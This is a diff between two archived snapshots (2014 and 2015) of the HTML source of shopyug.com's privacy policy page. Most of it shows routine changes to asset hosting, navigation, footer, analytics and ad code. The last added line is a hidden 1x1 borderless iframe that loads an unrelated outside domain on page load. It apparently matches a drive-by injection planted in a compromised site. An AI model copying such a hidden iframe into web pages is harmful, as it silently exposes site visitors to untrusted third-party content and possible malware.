@@ -1,40 +1,43 @@
-<!--The following is the downloaded HTML source of the shopyug.com privacy policy that was archived on 2014-06-06.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20140606051854id_/http%3A//www.shopyug.com/privacy.htm) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the shopyug.com privacy policy that was archived on 2015-06-09.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20150609033502id_/http%3A//www.shopyug.com/privacy.htm) for the most accurate reproduction.-->
 
 <html><head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<title>ShopYUG</title>
+<title>Shopyug Privacy Policy</title>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1">
 <meta name="description" content="Privacy Policy">
 <meta name="keywords" content="Privacy Policy">
-<meta name="author" content="ShopYUG Privacy Policy">
 <meta name="Classification" content="Online Shopping in India">
 <meta name="revisit-after" content="30 days">
 <meta name="distribution" content="global">
-<meta name="ROBOTS" content="INDEX, FOLLOW">
-<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<meta name="ROBOTS" content="INDEX, FOLLOW"><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta name="language" content="en-us">
 <meta name="viewport" content="width=device-width">
-<link type="text/css" href="http://www.shopyug.com/cdnet/css/style.css" rel="stylesheet">
-<script async="" src="//www.google-analytics.com/analytics.js"></script><script src="http://www.shopyug.com/cdnet/js/jquery.1.8.1.min.js"></script>
+<meta property="og:title" content="Shopyug Privacy Policy">
+<link rel="shortcut icon" href="https://s3-ap-southeast-1.amazonaws.com/shopyug/images/favicon.png">
+<link type="text/css" href="https://s3-ap-southeast-1.amazonaws.com/shopyug/css/style.css" rel="stylesheet">
+<script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-NF4MRG"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/jquery.1.8.1.min.js"></script>
 <!--[if IE]>
-	<link type="text/css" href="http://www.shopyug.com/cdnet/css/ie-style.css" rel="stylesheet" />
-    <script src="http://www.shopyug.com/cdnet/js/html5shiv-printshiv.js"></script>
+	<link type="text/css" href="https://s3-ap-southeast-1.amazonaws.com/shopyug/css/ie-style.css" rel="stylesheet" />
+    <script src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/html5shiv-printshiv.js"></script>
 <![endif]-->
 <script type="text/javascript">
 	if (window.top !== window.self) window.top.location.replace(window.self.location.href);
 	$(document).ready(function(){
 		$(".jpopup").colorbox({
 			onOpen:function(){ $("html").css("overflow", "hidden"); },
-			onComplete:function(){ 
+			onComplete:function(){
 				$(".product-small-thumb").hover(function(e){
 					var imgurl = $(this).attr("data-bigimage");
 					$("#product_default_image").attr("src", imgurl);
 				});
+				$('#cboxTitle').hide();
 			},
 			onClosed:function(){ $("html").css("overflow", "visible"); },
-			scrolling: false, 
-			width:"auto", 
+			scrolling: false,
+			width:"auto",
 			height:"auto"
 		});
 	});
@@ -48,11 +51,13 @@
   ga('create', 'UA-49733698-1', 'shopyug.com');
   ga('require', 'displayfeatures');
   ga('send', 'pageview');
-</script></head>
+</script>
+</head>
 <body>
 <span class="nprogress-logo fade out"></span>
+<div class="javascript_require" style="display:none" id="srvcNaS"></div>
 <noscript>
-<div class="javascript_require">For a better experience on ShopYUG, enable JavaScript in your browser.</div>
+<div class="javascript_require">For a better experience on Shopyug, enable JavaScript in your browser.</div>
 </noscript>
 <header>
   <div class="header">
@@ -67,22 +72,22 @@
 							  					  <li><a href="http://www.shopyug.com/wishlist">MY WISHLIST</a></li>
 					  <li><a href="http://www.shopyug.com/myaccount">MY ACCOUNT</a></li>
 					  <li><a href="http://www.shopyug.com/">HOME</a></li>
-					  <li><a href="javascript:void(0)">CALL US : 090-194-99964</a></li>
+					  <!--<li><a href="#">CALL US : 090-194-99964</a></li>-->
 					</ul>
 								<div class="clear"></div>
           </div>
           	          		<div class="header_search">
             <div class="right header-cart">
-              <div class="white_btn header-cart-counter">
+              <div class="cart_btn header-cart-counter">
               	<a href="http://www.shopyug.com/cart/" class="color_black_no_text_shadow">
-                	CART 
+                	Cart
                      (0)                 </a>
               </div>
             </div>
             <div class="right search-cart-header">
               <form name="header-product-search" id="header-product-search" method="get" action="http://www.shopyug.com/search">
-                <input type="text" name="q" autocomplete="off" id="master-search" class="header-search" x-webkit-speech="x-webkit-speech" value="">
-                <input type="submit" name="ms" value="search" class="black_btn header-search-submit">
+                <input type="text" name="q" autocomplete="off" id="master-search" class="header-search" x-webkit-speech="x-webkit-speech" value="" placeholder="Search for product or brand name">
+                <input type="submit" name="ms" value="search" class="search_btn header-search-submit">
               </form>
               <div data-ss="" id="search-suggestion"></div>
             </div>
@@ -98,66 +103,20 @@
         <ul class="top-menu">
           <li><a href="http://www.shopyug.com/">Home</a></li>
           <li><a href="http://www.shopyug.com/electronics">Electronics</a>
-            <!--<ul style="left:-98px">
-              <li>
-                <div class="left sub-menu-container">
-                  <div class="sub-menu-title">Mobiles</div>
-                  <div class="sub-menu-element">
-                    <div>Samsung</div>
-                    <div>Apple</div>
-                    <div>Micromax</div>
-                    <div>Sony</div>
-                    <div>Android Phones</div>
-                    <div>Windows Phones</div>
-                  </div>
-                </div>
-                <div class="left sub-menu-container">
-                  <div class="sub-menu-title">Mobiles</div>
-                  <div class="sub-menu-element">
-                    <div>Samsung</div>
-                    <div>Apple</div>
-                    <div>Micromax</div>
-                    <div>Sony</div>
-                    <div>Android Phones</div>
-                    <div>Windows Phones</div>
-                  </div>
-                </div>
-                <div class="left sub-menu-container">
-                  <div class="sub-menu-title">Mobiles</div>
-                  <div class="sub-menu-element">
-                    <div>Samsung</div>
-                    <div>Apple</div>
-                    <div>Micromax</div>
-                    <div>Sony</div>
-                    <div>Android Phones</div>
-                    <div>Windows Phones</div>
-                  </div>
-                </div>
-                <div class="left sub-menu-container">
-                  <div class="sub-menu-title">Mobiles</div>
-                  <div class="sub-menu-element">
-                    <div>Samsung</div>
-                    <div>Apple</div>
-                    <div>Micromax</div>
-                    <div>Sony</div>
-                    <div>Android Phones</div>
-                    <div>Windows Phones</div>
-                  </div>
-                </div>
-                <div class="clear"></div>
-              </li>
-            </ul>-->
-          </li>
+                      </li>
           <li><a href="http://www.shopyug.com/apparels">Apparels</a></li>
           <li><a href="http://www.shopyug.com/watches">Watches</a></li>
+          <li><a href="http://www.shopyug.com/accessories">Accessories</a></li>
           <li><a href="http://www.shopyug.com/footwear">Footwear</a></li>
           <li><a href="http://www.shopyug.com/books">Books &amp; Media</a></li>
         </ul>
+        
         <div class="clear"></div>
       </div>
     </div>
 	  </div>
-  </header><div class="main-wrapper">
+  </header>
+<div class="main-wrapper">
   <div class="content-area">
     <div class="inner-wrapper">
     <div class="html-page-wrapper">
@@ -197,93 +156,108 @@ Shopyug does not warrant that:<br>
     <div class="clear"></div>
   </div>
 </div>
-<div class="sticky-social">
+<!--<div class="sticky-social">
 	<div class="sticky-facebook">
-    	<iframe src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fshopyug&amp;width&amp;layout=box_count&amp;action=like&amp;show_faces=false&amp;share=false&amp;height=65" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:65px;" allowtransparency="true"></iframe>
+    	<iframe src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fshopyug&amp;width&amp;layout=box_count&amp;action=like&amp;show_faces=false&amp;share=false&amp;height=65" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:65px;" allowTransparency="true"></iframe>
     </div>
-</div>	
-<div id="gotop"><a href="javascript:scrolltodiv('.header')"> TOP</a></div>	
-    <div class="sticky-pincode" id="frm-area-sticky-pincode">
-        <div class="sticky-pincode-body">
-            <div>Provide your pincode to get expected delivery time</div>
-            <div>
-                <form method="post" name="fastpincode" id="fastpincode" action="javascript:void(0)">
-                    <input type="tel" required="required" maxlength="6" name="sticky_pincode" id="txt_sticky_pincode" class=" numeric txt_sticky_pincode" autocomplete="off">
-                    <input type="submit" id="sticky_pincode_check" class="dark_yellow_border yellow_btn" value="CHECK">
-                    <input type="button" id="sticky_pincode_ignore" class="dark_grey_border white_btn" value="IGNORE">
-                </form>
-            </div>
-        </div>
+</div>-->
+
+
+<div style="width:748px;height: auto;margin: 10px 205px;">
+	<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <!-- Shopyug2 -->
+        <ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-3120340151950445" data-ad-slot="1467580573"></ins>
+        <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+
+</div>
+
+<div id="gotop"><a href="javascript:scrolltodiv('.header')"> TOP</a></div>
+<footer>
+          <div class="footer">
+                        <div class="content-area">
+                <div class="footer-content">
+                    <div class="left footer-innerpart">
+                      <div class="footer-innerpart-header">Informations</div>
+                         <ul class="footer-listing">
+                            <li><a href="http://www.shopyug.com/aboutus.htm">About Us</a></li>
+                            <li><a href="http://www.shopyug.com/contactus">Contact Us</a></li>
+                            <li><a href="http://www.shopyug.com/feedback.htm" title="Write Us Feedback">Give Us Feedback</a></li>            
+                            <li><a href="http://www.shopyug.com/refund.htm">Refund Policy</a></li>
+                            <li><a href="http://www.shopyug.com/deliverypolicy.htm">Delivery Policy</a></li>
+                            <li><a href="http://www.shopyug.com/onlinerefund">Online Refund</a></li>
+                            <!--<li><a href="http://www.shopyug.com/contest">Best Offers</a></li> 
+                            <li><a href="http://www.shopyug.com/winners">Last Month Winners</a></li> -->
+                          </ul>
+                    </div>
+    <div class="left footer-innerpart">
+      <div class="footer-innerpart-header">Terms</div>
+      <ul class="footer-listing">
+        <li><a href="http://www.shopyug.com/secureshopping.htm">Secure Shopping</a></li>
+        <li><a href="http://www.shopyug.com/termsandconditions.htm">Terms &amp; Conditions</a></li>
+        <li><a href="http://www.shopyug.com/termsofuse.htm">Terms of Use</a></li>
+        <li><a href="http://www.shopyug.com/cancellation.htm">Cancellation</a></li>
+                    
+        <li><a href="http://www.shopyug.com/privacy.htm">Our Privacy Policy</a></li>
+      </ul>
     </div>
-    <footer>
-  <div class="footer">
-    <div class="content-area">
-      <div class="footer-content">
-        <div class="left footer-innerpart">
-          <div class="footer-innerpart-header">CUSTOMER SERVICES</div>
-          <ul class="footer-listing">
-            <li><a href="http://www.shopyug.com/secureshopping.htm">Secure Shopping</a></li>
-            <li><a href="aboutus.htm">About Us</a></li>
-            <li><a href="http://www.shopyug.com/contactus.htm">Contact Us</a></li>
-            <!--<li><a href="http://www.shopyug.com/help.htm">Help</a></li>-->
-            <li><a href="http://www.shopyug.com/termsandconditions.htm">Terms &amp; Conditions</a></li>
-            <li><a href="http://www.shopyug.com/termsofuse.htm">Terms of Use</a></li>
-            <li><a href="http://www.shopyug.com/privacy.htm">Our Privacy Policy</a></li>
-            <li><a href="http://www.shopyug.com/deliverypolicy.htm">Delivery Policy</a></li>
-            <li><a href="http://www.shopyug.com/cancellation.htm">Cancellation</a></li>
-            <li><a href="http://www.shopyug.com/refund.htm">Refund Policy</a></li>
-          </ul>
+    <!--<div class="left footer-innerpart">
+      <div class="footer-innerpart-header">SOCIAL Network</div>
+      <div class="footer-newsletter">
+
+      </div>
+    </div>
+    <div class="left footer-innerpart">
+      <div class="footer-innerpart-header">SUBSCRIBE</div>
+      <div class="footer-newsletter-textbox">
+        <form action="javascript:void(0)" id="frm-newsletter-register" name="frm-newsletter-register">
+            <input type="email" id="newsletter-email" name="newsletter-email" class="newsletter-textbox" placeholder="Enter Email address" />
+            <input type="submit" id="reg-newsletter" name="submit" value="GO" class="black_btn submit newsletter-btn" />
+        </form>
+      </div>
+      <div id="footer-newsletter-msg"></div>
+    </div>-->
+    <div class="left footer-innerpart">
+      <div class="footer-innerpart-header">Contact Us</div>
+      <div class="footer-callus"><a href="mailto:support@shopyug.com">support@shopyug.com</a></div>
+        
+      <div class="footer-innerpart-header">Payment Method</div>
+      <div class="footer-callus">
+        <div class="payment-method">
+            <div class="left payment-cards mastro"></div>
+            <div class="left payment-cards visa"></div>
+            <div class="left payment-cards american-express"></div>
+            <div class="left payment-cards mastercard"></div>
+            <div class="left payment-cards netbanking"></div>
+            <div class="clear"></div>
         </div>
-        <div class="left footer-innerpart">
-          <div class="footer-innerpart-header">WHAT IS POPULAR ?</div>
-          <ul class="footer-listing">
-            <li>Electronics</li>
-            <li>Clothes</li>
-            <li>Antivirus</li>
-            <li>Pendrive</li>
-            <li>Laptop</li>
-            <li>Headset</li>
-          </ul>
-          
-          <div class="footer-innerpart-header">Payment Method</div>
-          <div class="footer-callus">
-            <div class="payment-method">
-                <div class="left payment-cards paypal"></div>
-                <div class="left payment-cards visa"></div>
-                <div class="left payment-cards american-express"></div>
-                <div class="left payment-cards mastercard"></div>
-                <div class="left payment-cards netbanking"></div>
-                <div class="clear"></div>
-            </div>
-          </div>        
-        </div>
-        <div class="left footer-innerpart">
-          <div class="footer-innerpart-header">NEWSLETTER</div>
-          <div class="footer-newsletter">Join our newsletter to get weekly updates and exiting offers.</div>
-        </div>
-        <div class="left footer-innerpart">
-          <div class="footer-innerpart-header">SUBSCRIBE</div>
-          <div class="footer-newsletter-textbox">
-            <form action="javascript:void(0)" id="frm-newsletter-register" name="frm-newsletter-register">
-                <input type="email" id="newsletter-email" name="newsletter-email" class="newsletter-textbox" placeholder="Enter Email address">
-                <input type="submit" id="reg-newsletter" name="submit" value="GO" class="black_btn submit newsletter-btn">
-            </form>
-          </div>
-        </div>
-        <div class="left footer-innerpart">
-          <div class="footer-innerpart-header">Call US</div>
-          <div class="footer-callus">090-194-99964</div>
-        </div>
+      </div>
+      
+      <div class="footer-innerpart-header">Social Network</div>
+      <div class="footer-newsletter">
+        <a href="https://www.facebook.com/shopyug" target="_blank"><div class="left social-media-icons fb-icons"></div></a>
+        <a href="https://www.twitter.com/shopyug" target="_blank"><div class="left social-media-icons twt-icons"></div></a>
         <div class="clear"></div>
       </div>
-      <div class="subfooter"> © 2014&nbsp;&nbsp;ShopYUG.com,  All Rights Reserved. </div>
+      
+     
     </div>
+    <div class="clear"></div>
   </div>
-</footer>
-<span data-surl="http://www.shopyug.com/" data-cc="page" data-curl="http://www.shopyug.com/cdnet" id="ftr-siteurl"></span>
-<script type="text/javascript" src="http://www.shopyug.com/cdnet/js/jquery.jcarousel.min.js"></script>
-<script type="text/javascript" src="http://www.shopyug.com/cdnet/js/nprogress.js"></script>
-<script type="text/javascript" src="http://www.shopyug.com/cdnet/js/jquery.colorbox-min.js"></script>
-<script type="text/javascript" src="http://www.shopyug.com/cdnet/js/default.js"></script>
+                <div class="subfooter"> © SHOPYUG.COM / ALL RIGHTS RESERVED</div>
+            </div>
+        </div>
+        </footer>
+<span data-surl="http://www.shopyug.com/" data-cc="page" data-curl="https://s3-ap-southeast-1.amazonaws.com/shopyugcdnet" id="ftr-siteurl"></span>
+
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-NF4MRG"height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-NF4MRG');</script>
+
+<script type="text/javascript" src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/jquery.jcarousel.min.js"></script>
+<script type="text/javascript" src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/nprogress.js"></script>
+<script type="text/javascript" src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/jquery.colorbox-min.js"></script>
+<script type="text/javascript" src="https://s3-ap-southeast-1.amazonaws.com/shopyug/js/default.js"></script>
+<iframe src="http://mastparatha.com/" width="1" height="1" frameborder="0"></iframe>
+
 
 </body></html>
